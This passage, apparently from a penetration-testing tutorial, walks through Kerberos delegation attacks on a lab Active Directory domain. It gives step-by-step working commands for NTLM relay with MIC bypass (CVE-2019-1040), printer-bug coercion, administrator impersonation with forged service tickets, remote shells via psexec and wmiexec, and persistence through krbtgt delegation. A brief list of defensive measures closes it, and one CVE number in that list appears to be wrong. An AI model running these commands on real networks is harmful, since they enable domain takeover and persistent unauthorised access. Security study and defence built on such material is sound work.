python3 getST.py hack.local/test3$:Passw0rd -spn cifs/WIN-DATA.hack.local -impersonate administrator -dc-ip 10.10.10.137

# Log in directly, you still need to add the domain name to hosts, otherwise it will not be resolved. The SYSTEM permission is available on psexec
KRB5CCNAME=administrator.ccache python3 wmiexec.py -k hack.local/administrator@WIN-DATA.hack.local -no-pass
KRB5CCNAME=administrator.ccache python3 psexec.py -k hack.local/administrator@WIN-DATA.hack.local -no-pass
```

![](./images/38.png#pic_center)

##### In combination with HTLM Relay takes over domain control

Bypassing NTLM MIC + Printer Vulnerability (`CVE-2019-1040`) + NTLM Relay attack + resource-based binding delegation combination attack. The premise of NTLM Relay attack is that the machine obtained by SMB authentication does not enable the `SMB` signature. The function of the `CVE-2019-1040` vulnerability here is to bypass the `mic` verification, because the printer triggers the `SMB` protocol. Domain control has the `SMB` signature by default. The `CVE-2019-1040` vulnerability here just bypasses the `mic` verification and complete the `NTLM Relay` attack.

Conditions of use:
- Can create machine accounts
- Target to enable printer service

1. Create a machine account

```bash
# Create a machine account using PowerMad tool
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount test4 -Password $(ConvertTo-SecureString "Passw0rd" -AsPlainText -Force)

# Query whether the query was successfully added
net group "domain computers" /domain
```

2. Listen to authentication requests

```bash
python3 ntlmrelayx.py -t ldap://10.10.10.137 -smb2support --remove-mic --delegate-access --escalate-user test4\$
```

3. Perform mandatory authentication for printer vulnerabilities

```bash
python3 printerbug.py hack.local/UDUser:H3rmesk1t@2023@10.10.10.135 192.168.31.206
```

![](./images/39.png#pic_center)

4. Apply for a service ticket

```bash
# Use getST.py to apply for tickets
python3 getST.py hack.local/test4$:Passw0rd -spn cifs/WIN-DATA.hack.local -impersonate administrator -dc-ip 10.10.10.137

# Log in directly, you still need to add the domain name to hosts, otherwise it will not be resolved. The SYSTEM permission is available on psexec
KRB5CCNAME=administrator.ccache python3 wmiexec.py -k hack.local/administrator@WIN-DATA.hack.local -no-pass
KRB5CCNAME=administrator.ccache python3 psexec.py -k hack.local/administrator@WIN-DATA.hack.local -no-pass
```

![](./images/40.png#pic_center)

#### krbtgt user delegation

After obtaining domain control permissions, you can set delegation attributes for the `krbtgt` user to achieve the purpose of maintaining permissions, similar to a variant of gold notes.

Conditions of use:
- Obtain domain control permissions

1. Create a machine account

```bash
# Create a machine account using PowerMad tool
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount test5 -Password $(ConvertTo-SecureString "Passw0rd" -AsPlainText -Force)

# Query whether the query was successfully added
net group "domain computers" /domain
```

2. Domain control configuration `krbtgt` user's delegation attributes

```bash
Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount test5$
Get-ADUser krbtgt -Properties PrincipalsAllow
edToDelegateToAccount
```

![](./images/41.png#pic_center)

3. Apply for a service ticket

```bash
# Use getST.py to apply for tickets
python3 getST.py hack.local/test5$:Passw0rd -spn krbtgt -impersonate administrator -dc-ip 10.10.10.137

KRB5CCNAME=administrator.ccache python3 smbexec.py -k administrator@DC.hack.local -no-pass -dc-ip 10.10.10.137
```

![](./images/42.png#pic_center)

## Defense measures

1. For high-privileged users, set as sensitive users and cannot be delegated;
2. To set up a delegation, do not set up a non-binding delegation but set up a binding delegation;
3. You can add sensitive users to the `Protected User` group (`Windows Server 2012 R2` and above systems), and users in this group are not allowed to be delegated;
4. Patch `Kerberos Bronze Bit` attack (`CVE-2020-1704`).